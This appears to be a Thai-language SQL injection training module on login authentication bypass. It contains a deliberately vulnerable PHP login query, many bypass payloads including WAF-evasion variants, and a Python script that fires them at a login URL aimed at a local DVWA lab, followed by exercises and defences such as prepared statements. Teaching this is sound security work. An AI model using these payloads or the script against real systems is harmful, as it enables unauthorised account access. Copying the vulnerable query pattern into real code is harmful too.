# Part 015: Authentication Bypass ด้วย SQL Injection

## ภาพรวม

Authentication bypass เป็นหนึ่งในการ exploit SQL Injection ที่พบบ่อยที่สุดและอันตรายที่สุด ผู้โจมตีสามารถเข้าถึงระบบโดยไม่ต้องรู้รหัสผ่านที่แท้จริง

**ขั้นตอนที่ 156-170**

---

## 156. หลักการของ Authentication Bypass

### 56.1 Login Form ที่มีช่องโหว่

```php
// PHP code ที่มีช่องโหว่ (อย่าใช้ในระบบจริง!)
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users 
          WHERE username = '$username' 
          AND password = '$password'";

$result = mysqli_query($conn, $query);
if(mysqli_num_rows($result) > 0) {
    session_start();
    $_SESSION['logged_in'] = true;
}
```

### 56.2 Bypass Logic

```
Query ปกติ:
SELECT * FROM users WHERE username='admin' AND password='wrongpass'
→ ไม่พบ record → ล็อกอินไม่ได้

Query เมื่อ inject:
SELECT * FROM users WHERE username='admin'--' AND password=''
→ comment ทำให้ password check ถูก ignore
→ ถ้ามี user 'admin' อยู่ → ล็อกอินสำเร็จ
```

---

## 157. Payloads สำหรับ Authentication Bypass

### 57.1 Classic SQL Injection Bypass

```
username: admin'--
password: anything

Generated Query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

### 57.2 OR-based Bypass

```
username: ' OR '1'='1
password: ' OR '1'='1

Generated Query:
SELECT * FROM users 
WHERE username='' OR '1'='1' 
AND password='' OR '1'='1'

username: ' OR 1=1--
password: anything
```

### 57.3 Admin Bypass

```
username: admin' OR '1'='1'--
password: anything
```

### 57.4 UNION-Based Bypass

```
username: ' UNION SELECT 1,'admin','hacked',4,5--
password: anything
```

---

## 158. Bypass ด้วย Different Quote Styles

```
username: " OR "1"="1
username: ` OR `1`=`1
username: %27 OR %271%27=%271  (URL encoded)
```

---

## 159. Bypass ด้วย Comment Variations

```
-- MySQL
admin'--
admin'-- -
admin'#
admin'/*

-- MSSQL  
admin'--
admin'/*

-- Oracle
admin'--
```

---

## 160. Advanced Bypass Techniques

### 60.1 Whitespace Bypass

```
admin'/**/ OR /**/1=1--
admin'%09OR%091=1--    (tab)
admin'%0aOR%0a1=1--    (newline)
```

### 60.2 Case Variation

```
admin' oR '1'='1'--
admin' Or '1'='1'--
admin' OR '1'='1'--
```

---

## 161. Python Script สำหรับ Bypass Testing

```python
#!/usr/bin/env python3
"""
Authentication Bypass Tester
สำหรับการทดสอบ security เท่านั้น
"""

import requests
from typing import List, Tuple

class AuthBypassTester:
    def __init__(self, login_url: str, success_indicator: str = None):
        self.login_url = login_url
        self.success_indicator = success_indicator
        self.session = requests.Session()
        
        self.username_payloads = [
            ("admin'--", "Classic comment bypass"),
            ("admin'#", "MySQL hash comment"),
            ("' OR '1'='1'--", "OR condition bypass"),
            ("' OR 1=1--", "OR with integer"),
            ("admin' OR '1'='1'--", "Admin with OR"),
            ('" OR "1"="1"--', "Double quote bypass"),
            ("' OR 'a'='a'--", "String comparison"),
            ("admin'/**/OR/**/1=1--", "Comment padding"),
            ("' OR 1=1#", "Hash comment"),
            ("') OR ('1'='1", "Parenthesis bypass"),
            ("admin') OR ('1'='1'--", "Admin parenthesis"),
        ]
    
    def test_bypass(self, username: str, password: str = "test123") -> Tuple[bool, int]:
        data = {
            'username': username,
            'password': password,
        }
        
        r = self.session.post(self.login_url, data=data, allow_redirects=True)
        success = False
        
        if self.success_indicator:
            success = self.success_indicator in r.text
        else:
            fail_indicators = ['invalid', 'incorrect', 'wrong', 'failed', 'error']
            success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'account']
            text_lower = r.text.lower()
            has_fail = any(ind in text_lower for ind in fail_indicators)
            has_success = any(ind in text_lower for ind in success_indicators)
            if r.status_code == 302:
                success = True
            elif has_success and not has_fail:
                success = True
        
        return success, r.status_code
    
    def run_all_tests(self):
        print(f"[*] Testing Authentication Bypass on: {self.login_url}")
        print("="*70)
        
        for payload, description in self.username_payloads:
            success, status = self.test_bypass(payload)
            if success:
                print(f"[+] SUCCESS: {description}")
                print(f"    Payload: {payload}")
                print(f"    Status: {status}")
                print()
            else:
                print(f"[-] Failed: {description}")
        
        print("="*70)
    
    def test_both_fields(self):
        combos = [
            ("admin", "' OR '1'='1"),
            ("admin", "' OR 1=1--"),
            ("' OR '1'='1'--", "anything"),
            ("admin'--", "' OR '1'='1"),
        ]
        print("\n[*] Testing both fields...")
        for username, password in combos:
            success, status = self.test_bypass(username, password)
            if success:
                print(f"[+] Bypass success!")
                print(f"    Username: {username}")
                print(f"    Password: {password}")


if __name__ == "__main__":
    tester = AuthBypassTester(
        login_url="http://localhost/dvwa/login.php",
        success_indicator="Welcome to Damn Vulnerable"
    )
    tester.run_all_tests()
```

---

## 162. แบบฝึกหัด

### Exercise 1: DVWA Login Bypass

1. ไปที่ DVWA SQL Injection module
2. ทดสอบ payloads:
   ```
   1' OR '1'='1'--
   admin'--
   ' OR 1=1#
   ```

### Exercise 2: Secure Code Review

ดูโค้ดต่อไปนี้และระบุว่ามีช่องโหว่หรือไม่:

```php
// Code A
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, md5($password)]);

// Code B
$username = addslashes($_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

// Code C
$username = htmlspecialchars($_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
```

---

## สรุป

Authentication bypass ผ่าน SQL Injection:

1. **Classic** - admin'-- (comment out password check)
2. **OR bypass** - ' OR '1'='1'-- (always true condition)
3. **UNION bypass** - inject fake user credentials
4. **Advanced** - WAF bypass, encoding, case variation

**การป้องกัน:**
- ใช้ Prepared Statements เสมอ
- Hash passwords ด้วย bcrypt
- อย่าแสดง error messages
- เพิ่ม rate limiting
- ใช้ MFA

---

*Part 015 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
